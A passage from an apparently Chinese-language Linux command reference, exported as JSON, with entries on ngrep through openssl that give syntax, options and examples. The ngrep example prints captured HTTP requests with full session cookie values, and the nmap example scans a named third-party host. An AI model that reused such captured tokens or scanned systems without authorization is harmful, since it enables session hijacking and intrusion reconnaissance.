2.0.50727; .NET CLR 3.0.04506.30)..host: f59.r.56.com..Connection: Keep\n-Alive..Cookie: whistoryview=23423759-23635627-23423344-23171935-23058374-2\n3081156-23207350-22395727-; geoip=............; wl_all_s=y....\n```\n\nOK。地址已经找到了,就是http://f59.c31.56.com/flvdownload/12/19/ggyg7741@56.com_56flv_zhajm_11955697397.flv\n\n加个`-W byline`参数后,将解析包中的换行符：\n\n```shell\nT(6) 2007/11/25 15:56:12.192619 10.132.34.23:26365 -> 59.151.21.101:80 [AP]\nGET /aa.flv HTTP/1.1.\nAccept: */*.\nAccept-Language: zh-cn.\nUA-CPU: x86.\nAccept-Encoding: gzip, deflate.\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.5072\n7; .NET CLR 3.0.04506.30).\nHost: www.google.cn.\nConnection: Keep-Alive.\nCookie: PREF=id=a0b2932c336477e9:TB=4:NW=1:TM=1187877372:LM=1187956074:S=Y1Fzndp\nrT3vFo7ac; SID=DQAAAHcAAABJCEXeOVLHu2rIfb5BfKP3GG9PbhJDEkXsLTV8y0f_lvSd2Y46Q0FPt\n83CnEs9rxA1xBDM9mLR8-ckWeScyOQA8PyYnX5u5OjFvjfRbDg_FDZfwxhRzqS9KPZv26pjnsUxs0FDM\n1xpJ5AgDn38pXtlCdkksJ0-cbiIWoA61oHWMg; NID=7=AvJxn5B6YOLLxoYz4LLzhIbNsQUQiulRS6U\nJGxdBniQBmXm99y7L-NBNORN82N3unmZSGHFPfePVHnLK2MjYjglyXZhU9x7ETXNBnY3NurNijHDhJ7K\nyi7E53UBOcv4V.\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ngrep"]},{"title":"【Linux 命令】nice","url":"/linux-command/nice/","content":"\n改变程序执行的优先权等级\n\n## 补充说明\n\n**nice命令** 用于以指定的进程调度优先级启动其他的程序。\n\n###  语法\n\n```shell\nnice(选项)(参数)\n```\n\n###  选项\n\n```shell\n-n：指定进程的优先级（整数）。\n```\n\n###  参数\n\n指令及选项：需要运行的指令及其他选项。\n\n###  实例\n\n新建一个进程并设置优先级，将当前目录下的documents目录打包，但不希望tar占用太多CPU：\n\n```shell\nnice -19 tar zcf pack.tar.gz documents\n```\n\n方法非常简单，即在原命令前加上`nice -19`。很多人可能有疑问了，最低优先级不是19么？那是因为这个“-19”中的“-”仅表示参数前缀；所以，如果希望将当前目录下的documents目录打包，并且赋予tar进程最高的优先级：\n\n```shell\nnice --19 tar zcf pack.tar.gz documents\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","nice"]},{"title":"【Linux 命令】nisdomainname","url":"/linux-command/nisdomainname/","content":"\n显示主机NIS的域名\n\n## 补充说明\n\n**nisdomainname命令** 用于显示主机NIS的域名。\n\n###  语法\n\n```shell\nnisdomainname(选项)\n```\n\n###  选项\n\n```shell\n-v：详细信息模式。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","nisdomainname"]},{"title":"【Linux 命令】nl","url":"/linux-command/nl/","content":"\n为每一个文件添加行号。\n\n## 概要\n\n```shell\nnl [OPTION]... [FILE]...\n```\n\n## 主要用途\n\n- 将每一个输入的文件添加行号后发送到标准输出。\n- 当没有文件或文件为`-`时，读取标准输入\n- 处理逻辑页（logical page）。\n\n## 选项\n\n```shell\n-b, --body-numbering=STYLE           使用STYLE 为body部分的行附加行号。\n-d, --section-delimiter=CC           使用CC作为logical page的分隔符。\n-f, --footer-numbering=STYLE         使用STYLE 为footer部分的行附加行号。\n-h, --header-numbering=STYLE         使用STYLE 为header部分的行附加行号。\n-i, --line-increment=NUMBER          行号递增间隔为NUMBER。\n-l, --join-blank-lines=NUMBER        连续NUMBER行的空行作为一行处理。\n-n, --number-format=FORMAT           根据FORMAT插入行号。\n-p, --no-renumber                    不要在每个部分重置行号。\n-s, --number-separator=STRING        在行号后添加字符串STRING。\n-v, --starting-line-number=NUMBER    每部分的起始行号。\n-w, --number-width=NUMBER            行号宽度为NUMBER。\n--help                               显示帮助信息并退出。\n--version                            显示版本信息并退出。\n\n\n默认选项为：-bt -d'\\:' -fn -hn -i1 -l1 -nrn -sTAB -v1 -w6\n\nCC是由两个字符组成的，默认为\\: ,第二个字符如果缺失则默认为:\n\nSTYLE可以为下列可用值之一：\n\na       所有行标记行号。\nt       仅为非空行标记行号。\nn       不标记行号。\npBRE    符合基础正则表达式（BRE）的行会标记行号。\n\nFORMAT可以为下列可用值之一：\n\nln    左对齐，不会在开始部分补充0以满足宽度。\nrn    右对齐，不会在开始部分补充0以满足宽度。\nrz    右对齐，会在开始部分补充0以满足宽度。\n\nlogical page\n三部分组成（header， body， footer）\n起始标记（header \\:\\:\\:， body \\:\\:， footer \\:）\n```\n\n## 参数\n\nFILE（可选）：要处理的文件，可以为一或多个。\n\n## 返回值\n\n返回0表示成功，返回非0值表示失败。\n\n## 例子\n\n```shell\nnl_logicalpage.txt：该文件用于说明nl命令处理逻辑页，内容如下：\n\\:\\:\\:\nheader_1\n\\:\\:\nbody_1\n\\:\nfooter_1\n\\:\\:\\:\nheader_2\n\\:\\:\nbody_2\n\\:\nfooter_2\n```\n\n```shell\n[user2@pc ~]$ nl nl_logicalpage.txt\n\n       header_1\n\n     1\tbody_1\n\n       footer_1\n\n       header_2\n\n     1\tbody_2\n\n       footer_2\n\n[user2@pc ~]$ nl -v0 -fa -ha nl_logicalpage.txt\n\n     0\theader_1\n\n     1\tbody_1\n\n     2\tfooter_1\n\n     0\theader_2\n\n     1\tbody_2\n\n     2\tfooter_2\n\n[user2@pc ~]$ nl -p -fa -ha nl_logicalpage.txt\n\n     1\theader_1\n\n     2\tbody_1\n\n     3\tfooter_1\n\n     4\theader_2\n\n     5\tbody_2\n\n     6\tfooter_2\n```\n\n```shell\nnl_normal.txt：该文件用于说明nl命令处理普通文件，内容如下：\nZhuangZhu-74\n2019-11-21\n127.0.0.1\n```\n\n```shell\n[user2@pc ~]$ nl nl_normal.txt\n     1\tZhuangZhu-74\n     2\t2019-11-21\n     3\t127.0.0.1\n\n[user2@pc ~]$ nl -b p'1$' nl_normal.txt\n       ZhuangZhu-74\n     1\t2019-11-21\n     2\t127.0.0.1\n\n[user2@pc ~]$ nl -b p'^[A-Z]' nl_normal.txt\n     1\tZhuangZhu-74\n       2019-11-21\n       127.0.0.1\n```\n\n### 注意\n\n1. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 nl`，`info coreutils 'nl invocation'`。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","nl"]},{"title":"【Linux 命令】nm","url":"/linux-command/nm/","content":"\n显示二进制目标文件的符号表\n\n## 补充说明\n\n**nm命令** 被用于显示二进制目标文件的符号表。\n\n###  语法\n\n```shell\nnm(选项)(参数)\n```\n\n###  选项\n\n```shell\n-A：每个符号前显示文件名；\n-D：显示动态符号；\n-g：仅显示外部符号；\n-r：反序显示符号表。\n```\n\n###  参数\n\n目标文件：二进制目标文件，通常是库文件和可执行文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","nm"]},{"title":"【Linux 命令】nmap","url":"/linux-command/nmap/","content":"\n网络探测和安全审核\n\n## 补充说明\n\n**nmap命令** 是一款开放源代码的网络探测和安全审核工具，它的设计目标是快速地扫描大型网络。\n\n###  语法 \n\n```shell\nnmap(选项)(参数)\n```\n\n###  选项 \n\n```shell\n-O：激活操作探测；\n-P0：值进行扫描，不ping主机；\n-PT：是同TCP的ping；\n-sV：探测服务版本信息；\n-sP：ping扫描，仅发现目标主机是否存活；\n-ps：发送同步（SYN）报文；\n-PU：发送udp ping；\n-PE：强制执行直接的ICMPping；\n-PB：默认模式，可以使用ICMPping和TCPping；\n-6：使用IPv6地址；\n-v：得到更多选项信息；\n-d：增加调试信息地输出；\n-oN：以人们可阅读的格式输出；\n-oX：以xml格式向指定文件输出信息；\n-oM：以机器可阅读的格式输出；\n-A：使用所有高级扫描选项；\n--resume：继续上次执行完的扫描；\n-P：指定要扫描的端口，可以是一个单独的端口，用逗号隔开多个端口，使用“-”表示端口范围；\n-e：在多网络接口Linux系统中，指定扫描使用的网络接口；\n-g：将指定的端口作为源端口进行扫描；\n--ttl：指定发送的扫描报文的生存期；\n--packet-trace：显示扫描过程中收发报文统计；\n--scanflags：设置在扫描报文中的TCP标志。\n--send-eth/--send-ip 使用原始以太网发送/构造指定IP发送\n```\n\n###  参数 \n\nip地址：指定待扫描报文中的TCP地址。\n\n###  实例 \n\n **安装nmap** \n\n```shell\nyum install nmap\n```\n\n **使用nmap扫描www.jsdig.com的开放端口** \n\n```shell\n[root@localhost ~]# nmap www.jsdig.com\n\nStarting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-12-28 00:06 CST\nInteresting ports on 100-42-212-8.static.webnx.com (100.42.212.8):\nNot shown: 1678 filtered ports\nPORT   STATE service\n22/tcp open  ssh\n80/tcp open  http\n\nNmap finished: 1 IP address (1 host up) scanned in 45.870 seconds\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","nmap"]},{"title":"【Linux 命令】nmcli","url":"/linux-command/nmcli/","content":"\n地址配置工具\n\n## 补充说明\n\n**nmcli命令** 是 NetworkManager client 网络管理客户端。\n\n###  语法\n\n```shell\nnmcli [OPTIONS] OBJECT { COMMAND | help }\n```\n\n###  选项\n\n```shell\nOPTIONS\n  -t[erse]                                  # terse output 简洁的输出\n  -p[retty]                                 # pretty output 漂亮的输出\n  -m[ode] tabular|multiline                 # output mode  输出模式\n  -f[ields] <field1,field2,...>|all|common  # specify fields to output 指定要输出的字段\n  -e[scape] yes|no                          # escape columns separators in values 在值中转义列分隔符\n  -n[ocheck]                                # 不要检查nmcli和NetworkManager版本\n  -a[sk]                                    # 要求缺少参数\n  -w[ait] <seconds>                         # 设置超时等待整理操作\n  -v[ersion]                                # 显示程序版本\n  -h[elp]                                   # 打印此帮助\n\nOBJECT\n  g[eneral]       NetworkManager的一般状态和操作\n  n[etworking]    整体组网控制\n  r[adio]         NetworkManager切换开关\n  c[onnection]    NetworkManager的连接\n  d[evice]        由NetworkManager管理的设备\n  a[gent]         NetworkManager秘密代理或polkit代理\n```\n\n###  实例\n\n```shell\nnmcli connection show           # 查看当前连接状态\nnmcli connection reload         # 重启服务\nnmcli connection show -active   # 显示活动的连接\nnmcli connection show \"lan eth0\"# 显示指定一个网络连接配置\nnmcli device status             # 显示设备状态\nnmcli device show eno16777736   # 显示指定接口属性\nnmcli device show               # 显示全部接口属性\nnmcli con up static             # 启用static连接配置\nnmcli con up default            # 启用default连接配置 \nnmcli con add help              # 查看帮助\n\n```\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","nmcli"]},{"title":"【Linux 命令】nohup","url":"/linux-command/nohup/","content":"\n将程序以忽略挂起信号的方式运行起来\n\n## 补充说明\n\n**nohup命令** 可以将程序以忽略挂起信号的方式运行起来，被运行的程序的输出信息将不会显示到终端。\n\n无论是否将 nohup 命令的输出重定向到终端，输出都将附加到当前目录的 nohup.out 文件中。如果当前目录的 nohup.out 文件不可写，输出重定向到`$HOME/nohup.out`文件中。如果没有文件能创建或打开以用于追加，那么 command 参数指定的命令不可调用。如果标准错误是一个终端，那么把指定的命令写给标准错误的所有输出作为标准输出重定向到相同的文件描述符。\n\n###  语法 \n\nnohup(选项)(参数)\n\n###  选项 \n\n```shell\n--help：在线帮助；\n--version：显示版本信息。\n```\n\n###  参数 \n\n程序及选项：要运行的程序及选项。\n\n###  实例 \n\n\n使用nohup命令提交作业，如果使用nohup命令提交作业，那么在缺省情况下该作业的所有输出都被重定向到一个名为nohup.out的文件中，除非另外指定了输出文件：\n\n```shell\nnohup command > myout.file 2>&1 &\n```\n\n在上面的例子中，输出被重定向到myout.file文件中。\n\n该指令表示不做挂断操作，后台下载\n\n```shell\nnohup wget site.com/file.zip\n```\n\n下面命令，会在同一个目录下生成一个名称为 `nohup.out` 的文件，其中包含了正在运行的程序的输出内容\n\n```shell\nnohup ping -c 10 baidu.com\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","nohup"]},{"title":"【Linux 命令】nologin","url":"/linux-command/nologin/","content":"\n拒绝用户登录系统\n\n## 补充说明\n\n**nologin命令** 可以实现礼貌地拒绝用户登录系统，同时给出信息。如果尝试以这类用户登录，就在log里添加记录，然后在终端输出This account is currently not available信息，就是这样。一般设置这样的帐号是给启动服务的账号所用的，这只是让服务启动起来，但是不能登录系统。\n\n###  语法\n\n```shell\nnologin\n```\n\n###  实例\n\nLinux禁止用户登录：\n\n禁止用户登录后，用户不能登录系统，但可以登录ftp、SAMBA等。我们在Linux下做系统维护的时候，希望个别用户或者所有用户不能登录系统，保证系统在维护期间正常运行。这个时候我们就要禁止用户登录。  \n\n1、禁止个别用户登录，比如禁止lynn用户登录。\n\n```shell\npasswd -l lynn\n```\n\n这就话的意思是锁定lynn用户，这样该用户就不能登录了。  \n\n```shell\npasswd -u lynn\n```\n\n上面是对锁定的用户lynn进行解锁，用户可登录了。    \n\n2、我们通过修改`/etc/passwd`文件中用户登录的shell\n\n```shell\nvi /etc/passwd\n```\n\n更改为：\n\n```shell\nlynn:x:500:500::/home/lynn:/sbin/nologin\n```\n\n该用户就无法登录了。  \n\n3、禁止所有用户登录。\n\n```shell\ntouch /etc/nologin\n```\n\n除root以外的用户不能登录了。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","nologin"]},{"title":"【Linux 命令】nproc","url":"/linux-command/nproc/","content":"\n打印可用的处理器单元数量。\n\n## 概要\n\n```shell\nnproc [OPTION]...\n```\n\n## 主要用途\n\n- 打印可用的处理器单元数量。\n\n## 选项\n\n```shell\n--all         打印已安装处理器的数量。\n--ignore=N    如果可以的情况下，排除 N 个处理单元。\n--help        显示帮助信息并退出。\n--version     显示版本信息并退出。\n```\n\n## 例子\n\n```shell\n[root@localhost ~]# nproc\n8\n```\n\n### 注意\n\n1. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 nproc`，`info coreutils 'nproc invocation'`。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","nproc"]},{"title":"【Linux 命令】nslookup","url":"/linux-command/nslookup/","content":"\n查询域名DNS信息的工具\n\n## 补充说明\n\n**nslookup命令** 是常用域名查询工具，就是查DNS信息用的命令。\n\nnslookup4有两种工作模式，即“交互模式”和“非交互模式”。在“交互模式”下，用户可以向域名服务器查询各类主机、域名的信息，或者输出域名中的主机列表。而在“非交互模式”下，用户可以针对一个主机或域名仅仅获取特定的名称或所需信息。\n\n进入交互模式，直接输入nslookup命令，不加任何参数，则直接进入交互模式，此时nslookup会连接到默认的域名服务器（即`/etc/resolv.conf`的第一个dns地址）。或者输入`nslookup -nameserver/ip`。进入非交互模式，就直接输入`nslookup 域名`就可以了。\n\n###  语法\n\n```shell\nnslookup(选项)(参数)\n```\n\n###  选项\n\n```shell\n-sil：不显示任何警告信息。\n```\n\n###  参数\n\n域名：指定要查询域名。\n\n###  实例\n\n```shell\n[root@localhost ~]# nslookup www.jsdig.com\nServer:         202.96.104.15\nAddress:        202.96.104.15#53\n\nNon-authoritative answer:\nwww.jsdig.com canonical name = host.1.jsdig.com.\nName:   host.1.jsdig.com\nAddress: 100.42.212.8\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","nslookup"]},{"title":"【Linux 命令】ntpdate","url":"/linux-command/ntpdate/","content":"\n使用网络计时协议（NTP）设置日期和时间\n\n## 补充说明\n\n**ntpdate命令** 是用来设置本地日期和时间。它从指定的每个服务器获得了一些样本，并应用标准 NTP 时钟过滤器和选择算法来选择最好的样本。\n\n此 ntpdate 命令使用以下方法进行时间调整：\n\n*   如果它确定时钟偏差超过 0.5 秒，它通过调用 settimeofday 子例程设置时钟时间。在引导时间，这是一个首选的方法。\n*   如 果它确定时钟偏差小于 0.5 秒，它通过调用 adjtime 子例程和偏移量来调整时钟时间。此方法倾向于用牺牲一些稳定性来保持漂移时钟更加准确。 当不是通过运行一个守护程序而是从 cron 命令有规则的运行ntpdate 命令时，每一小时或两小时执行一次可以保证足够的走时精度，从而避免调整时钟。\n\n使用很多服务器可以大幅度改善 ntpdate 命令的可靠性与精度。尽管能使用单一服务器，但您能通过提供至少三个或四个服务器以获得更好的性能。\n\n如果一个类似 xntpd 守护程序的 NTP 服务器守护程序正在同一主机上运行，命令将拒绝ntpdate 设置日期。\n\n你必须有 root 权限才能在主机上运行这个命令。\n\n###  语法\n\n```shell\nntpdate [ -b] [ -d] [ -s] [ -u] [ -aKeyid] [ -eAuthenticationDelay] [ -kKeyFile] [ -oVersion] [ -pSamples] [ -tTimeOut] Server...\n```\n\n###  选项\n\n<table>\n<tbody>\n<tr>\n<td>-aKeyid</td>\n<td>使用 Keyid 来认证全部数据包。</td>\n</tr>\n<tr>\n<td>-b</td>\n<td>通过调用 settimeofday 子例程来增加时钟的时间。</td>\n</tr>\n<tr>\n<td>-d</td>\n<td>指定调试方式。判断 ntpdate 命令会产生什么结果（不产生实际的结果）。结果再现在屏幕上。这个标志使用无特权的端口。</td>\n</tr>\n<tr>\n<td>-eAuthenticationDelay</td>\n<td>指定延迟认证处理的时间秒数。</td>\n</tr>\n<tr>\n<td>-kKeyFile</td>\n<td>当不使用缺省值 /etc/ntp.keys 文件时，为包含密钥的文件指定一个不同的名称。 请参阅文件KeyFile的描述。</td>\n</tr>\n<tr>\n<td>-oVersion</td>\n<td>当轮询它的发出数据包时，指定使用的 NTP 版本实现。 Version 的值可以是 1，2，3。缺省值是 3。</td>\n</tr>\n<tr>\n<td>-pSamples</td>\n<td>指定从每个服务器获取的样本的数目。 Samples 的值在 1 和 8 之间，并包括 1 和 8。它的缺省值是 4。</td>\n</tr>\n<tr>\n<td>-s</td>\n<td>指定日志操作 syslog 设施的使用，而不是使用标准输出。 当运行 ntpdate 命令和 cron命令时，它是很有用的。</td>\n</tr>\n<tr>\n<td>-tTimeOut</td>\n<td>指定等待响应的时间。给定 TimeOut 的值四舍五入为 0.2 秒的倍数。缺省值是 1 秒。</td>\n</tr>\n<tr>\n<td>-u</td>\n<td>指定使用无特权的端口发送数据包。 当在一个对特权端口的输入流量进行阻拦的防火墙后是很有益的， 并希望在防火墙之外和主机同步。防火墙是一个系统或者计算机，它控制从外网对专用网的访问。</td>\n</tr>\n</tbody>\n</table>\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ntpdate"]},{"title":"【Linux 命令】ntsysv","url":"/linux-command/ntsysv/","content":"\n集中管理系统的各种服务\n\n## 补充说明\n\n**ntsysv命令** 提供了一个基于文本界面的菜单操作方式，集中管理系统不同的运行等级下的系统服务启动状态。在RedHat各个发行版，CentOS各个版本，都自带这个工具。它具有互动式操作界面，您可以轻易地利用方向键和空格键等，开启，关闭操作系统在每个执行等级中，所要执行的系统服务。\n\n###  语法 \n\n```shell\nntsysv(选项)\n```\n\n###  选项 \n\n```shell\n--leve：指定运行等级；\n--back：在互动式界面里，显示Back钮，而非cancel钮。\n```\n\n###  实例 \n\n输入ntsysv命令后，出现一个交互式的管理菜单，如下：\n\n```shell\n!ntsysv\n```\n\n使用空格键选择或者取消选项！\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ntsysv"]},{"title":"【Linux 命令】od","url":"/linux-command/od/","content":"\n输出文件的八进制、十六进制等格式编码的字节\n\n## 补充说明\n\n**od命令** 用于输出文件的八进制、十六进制或其它格式编码的字节，通常用于显示或查看文件中不能直接显示在终端的字符。\n\n常见的文件为文本文件和二进制文件。此命令主要用来查看保存在二进制文件中的值。比如，程序可能输出大量的数据记录，每个数据是一个单精度浮点数。这些数据记录存放在一个文件中，如果想查看下这个数据，这时候od命令就派上用场了。在我看来，od命令主要用来格式化输出文件数据，即对文件中的数据进行无二义性的解释。不管是IEEE754格式的浮点数还是ASCII码，od命令都能按照需求输出它们的值。\n\n###  语法\n\n```shell\nod(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：此参数的效果和同时指定“-ta”参数相同；\n-A：<字码基数>：选择以何种基数计算字码；\n-b：此参数的效果和同时指定“-toC”参数相同；\n-c：此参数的效果和同时指定“-tC”参数相同；\n-d：此参数的效果和同时指定“-tu2”参数相同；\n-f：此参数的效果和同时指定“-tfF”参数相同；\n-h：此参数的效果和同时指定“-tx2”参数相同；\n-i：此参数的效果和同时指定“-td2”参数相同；\n-j<字符数目>或--skip-bytes=<字符数目>：略过设置的字符数目；\n-l：此参数的效果和同时指定“-td4”参数相同；\n-N<字符数目>或--read-bytes=<字符数目>：到设置的字符树目为止；\n-o：此参数的效果和同时指定“-to2”参数相同；\n-s<字符串字符数>或--strings=<字符串字符数>：只显示符合指定的字符数目的字符串；\n-t<输出格式>或--format=<输出格式>：设置输出格式；\n-v或--output-duplicates：输出时不省略重复的数据；\n-w<每列字符数>或--width=<每列字符数>：设置每列的最大字符数；\n-x：此参数的效果和同时指定“-h”参数相同；\n--help：在线帮助；\n--version：显示版本信息。\n```\n\n###  参数\n\n文件：指定要显示的文件。\n\n###  实例\n\n```shell\n[linuxde@localhost ~]$ echo abcdef g > tmp\n[linuxde@localhost ~]$ cat tmp\nabcdef g\n```\n\n说明：先准备一个tmp文件\n\n```shell\n[linuxde@localhost ~]$ od -b tmp\n0000000 141 142 143 144 145 146 040 147 012\n0000011\n```\n\n说明：使用单字节八进制解释进行输出，注意左侧的默认地址格式为八字节\n\n```shell\n[linuxde@localhost ~]$ od -c tmp\n0000000   a   b   c   d   e   f       g  \\n\n0000011\n```\n\n说明：使用ASCII码进行输出，注意其中包括转义字符\n\n```shell\n[linuxde@localhost ~]$ od -t d1 tmp\n0000000   97   98   99  100  101  102   32  103   10\n0000011\n```\n\n说明：使用单字节十进制进行解释\n\n```shell\n[linuxde@localhost ~]$ od -A d -c tmp\n0000000   a   b   c   d   e   f       g  \\n\n0000009\n```\n\n说明：设置地址格式为十进制。\n\n```shell\n[linuxde@localhost ~]$ od -A x -c tmp\n000000   a   b   c   d   e   f       g  \\n\n000009\n```\n\n说明：设置地址格式为十六进制\n\n```shell\n[linuxde@localhost ~]$ od -j 2 -c tmp\n0000002   c   d   e   f       g  \\n\n0000011\n```\n\n说明：跳过开始的两个字节\n\n```shell\n[linuxde@localhost ~]$ od -N 2 -j 2 -c tmp\n0000002   c   d\n0000004\n```\n\n说明：跳过开始的两个字节，并且仅输出两个字节\n\n```shell\n[linuxde@localhost ~]$ od -w1 -c tmp\n0000000   a\n0000001   b\n0000002   c\n0000003   d\n0000004   e\n0000005   f\n0000006   \n0000007   g\n0000010  \\n\n0000011\n```\n\n说明：每行仅输出1个字节\n\n```shell\n[linuxde@localhost ~]$ od -w2 -c tmp\n0000000   a   b\n0000002   c   d\n0000004   e   f\n0000006       g\n0000010  \\n\n0000011\n```\n\n说明：每行输出两个字节\n\n```shell\n[linuxde@localhost ~]$ od -w3 -b tmp\n0000000 141 142 143\n0000003 144 145 146\n0000006 040 147 012\n0000011\n```\n\n说明：每行输出3个字节，并使用八进制单字节进行解释\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","od"]},{"title":"【Linux 命令】openssl","url":"/linux-command/openssl/","content":"\n强大的安全套接字层密码库\n\n## 补充说明\n\n**OpenSSL** 是一个强大的安全套接字层密码库，囊括主要的密码算法、常用的密钥和证书封装管理功能及SSL协议，并提供丰富的应用程序供测试或其它目的使用。在OpenSSL被曝出现严重安全漏洞后，发现多数通过SSL协议加密的网站使用名为OpenSSL的开源软件包。由于这是互联网应用最广泛的安全传输方法，被网银、在线支付、电商网站、门户网站、电子邮件等重要网站广泛使用，所以该漏洞影响范围广大。\n\nOpenSSL有两种运行模式：交互模式和批处理模式。\n\n直接输入openssl回车进入交互模式，输入带命令选项的openssl进入批处理模式。\n\nOpenSSL整个软件包大概可以分成三个主要的功能部分：密码算法库、SSL协议库以及应用程序。OpenSSL的目录结构自然也是围绕这三个功能部分进行规划的。 \n\n **对称加密算法**\n\nOpenSSL一共提供了8种对称加密算法，其中7种是分组加密算法，仅有的一种流加密算法是RC4。这7种分组加密算法分别是AES、DES、Blowfish、CAST、IDEA、RC2、RC5，都支持电子密码本模式（ECB）、加密分组链接模式（CBC）、加密反馈模式（CFB）和输出反馈模式（OFB）四种常用的分组密码加密模式。其中，AES使用的加密反馈模式（CFB）和输出反馈模式（OFB）分组长度是128位，其它算法使用的则是64位。事实上，DES算法里面不仅仅是常用的DES算法，还支持三个密钥和两个密钥3DES算法。 \n\n **非对称加密算法**\n\nOpenSSL一共实现了4种非对称加密算法，包括DH算法、RSA算法、DSA算法和椭圆曲线算法（EC）。DH算法一般用于密钥交换。RSA算法既可以用于密钥交换，也可以用于数字签名，当然，如果你能够忍受其缓慢的速度，那么也可以用于数据加密。DSA算法则一般只用于数字签名。 \n\n **信息摘要算法**\n\nOpenSSL实现了5种信息摘要算法，分别是MD2、MD5、MDC2、SHA（SHA1）和RIPEMD。SHA算法事实上包括了SHA和SHA1两种信息摘要算法，此外，OpenSSL还实现了DSS标准中规定的两种信息摘要算法DSS和DSS1。 \n\n **密钥和证书管理**\n\n密钥和证书管理是PKI的一个重要组成部分，OpenSSL为之提供了丰富的功能，支持多种标准。 \n\n首先，OpenSSL实现了ASN.1的证书和密钥相关标准，提供了对证书、公钥、私钥、证书请求以及CRL等数据对象的DER、PEM和BASE64的编解码功能。OpenSSL提供了产生各种公开密钥对和对称密钥的方法、函数和应用程序，同时提供了对公钥和私钥的DER编解码功能。并实现了私钥的PKCS#12和PKCS#8的编解码功能。OpenSSL在标准中提供了对私钥的加密保护功能，使得密钥可以安全地进行存储和分发。 \n\n在此基础上，OpenSSL实现了对证书的X.509标准编解码、PKCS#12格式的编解码以及PKCS#7的编解码功能。并提供了一种文本数据库，支持证书的管理功能，包括证书密钥产生、请求产生、证书签发、吊销和验证等功能。 \n\n事实上，OpenSSL提供的CA应用程序就是一个小型的证书管理中心（CA），实现了证书签发的整个流程和证书管理的大部分机制。\n\n### 实例\n\n**1、使用 openssl 生成密码**\n\n几乎所有 Linux 发行版都包含 openssl。我们可以利用它的随机功能来生成可以用作密码的随机字母字符串。\n\n```shell\nopenssl rand -base64 10\n# nU9LlHO5nsuUvw==\n```\n\nnU9LlHO5nsuUvw==\n\n**2、消息摘要算法应用例子**\n\n用SHA1算法计算文件file.txt的哈西值，输出到stdout：\n\n```shell\n# openssl dgst -sha1 file.txt\n```\n\n用SHA1算法计算文件file.txt的哈西值，输出到文件digest.txt：\n\n```shell\n# openssl sha1 -out digest.txt file.txt\n```\n\n用DSS1(SHA1)算法为文件file.txt签名，输出到文件dsasign.bin。签名的private key必须为DSA算法产生的，保存在文件dsakey.pem中。\n\n```shell\n# openssl dgst -dss1 -sign dsakey.pem -out dsasign.bin file.txt\n```\n\n用dss1算法验证file.txt的数字签名dsasign.bin，验证的private key为DSA算法产生的文件dsakey.pem。\n\n```shell\n# openssl dgst -dss1 -prverify dsakey.pem -signature dsasign.bin file.txt\n```\n\n用sha1算法为文件file.txt签名,输出到文件rsasign.bin，签名的private key为RSA算法产生的文件rsaprivate.pem。\n\n```shell\n# openssl sha1 -sign rsaprivate.pem -out rsasign.bin file.txt\n```\n\n用sha1算法验证file.txt的数字签名rsasign.bin，验证的public key为RSA算法生成的rsapublic.pem。\n\n```shell\n# openssl sha1 -verify rsapublic.pem -signature rsasign.bin file.txt\n```\n\n **3、对称加密应用例子**\n\n对称加密应用例子，用DES3算法的CBC模式加密文件plaintext.doc，加密结果输出到文件ciphertext.bin。\n\n```shell\n# openssl enc -des3 -salt -in plaintext.doc -out ciphertext.bin\n```\n\n用DES3算法的OFB模式解密文件ciphertext.bin，提供的口令为trousers，输出到文件plaintext.doc。注意：因为模式不同，该命令不能对以上的文件进行解密。\n\n```shell\n# openssl enc -des-ede3-ofb -d -in ciphertext.bin -out plaintext.doc -pass pass:trousers\n```\n\n用Blowfish的CFB模式加密plaintext.doc，口令从环境变量PASSWORD中取，输出到文件ciphertext.bin。\n\n```shell\n# openssl bf-cfb -salt -in plaintext.doc -out ciphertext.bin -pass env:PASSWORD\n```\n\n给文件ciphertext.bin用base64编码，输出到文件base64.txt。\n\n```shell\n# openssl base64 -in ciphertext.bin -out base64.txt\n```\n\n用RC5算法的CBC模式加密文件plaintext.doc，输出到文件ciphertext.bin，salt、key和初始化向量(iv)在命令行指定。\n\n```shell\n# openssl rc5 -in plaintext.doc -out ciphertext.bin -S C62CB1D49F158ADC -iv E9EDACA1BD7090C6 -K 89D4B1678D604FAA3DBFFD030A314B29\n```\n\n **4、Diffie-Hellman应用例子**\n\n使用生成因子2和随机的1024-bit的素数产生D0ffie-Hellman参数，输出保存到文件dhparam.pem\n\n```shell\n# openssl dhparam -out dhparam.pem -2 1024\n```\n\n从dhparam.pem中读取Diffie-Hell参数，以C代码的形式，输出到stdout。\n\n```shell\n# openssl dhparam -in dhparam.pem -noout -C\n```\n\n **5、DSA应用例子应用例子**\n\n生成1024位DSA参数集，并输出到文件dsaparam.pem。\n\n```shell\n# openssl dsaparam -out dsaparam.pem 1024\n```\n\n使用参数文件dsaparam.pem生成DSA私钥匙，采用3DES加密后输出到文件dsaprivatekey.pem\n\n```shell\n# openssl gendsa -out dsaprivatekey.pem -des3 dsaparam.pem\n```\n\n使用私钥匙dsaprivatekey.pem生成公钥匙，输出到dsapublickey.pem\n\n```shell\n# openssl dsa -in dsaprivatekey.pem -pubout -out 